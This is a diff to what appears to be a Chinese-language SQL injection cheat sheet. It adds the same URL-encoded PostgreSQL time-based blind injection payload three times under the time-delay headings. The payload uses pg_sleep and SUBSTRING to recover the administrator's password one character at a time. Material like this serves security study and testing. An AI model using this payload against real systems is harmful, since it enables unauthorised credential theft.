@@ -109,6 +109,11 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 
 ### 时间延迟
 
+```sql
+// Some code
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
 ### 有条件的时间延迟
 
 ### DNS查询
@@ -165,6 +170,11 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 ### 堆叠查询
 
 ### 时间延迟
+
+```sql
+// Some code
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+```
 
 ### 有条件的时间延迟
 
@@ -227,6 +237,11 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 ### 堆叠查询
 
 ### 时间延迟
+
+```sql
+// Some code
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+```
 
 ### 有条件的时间延迟
 
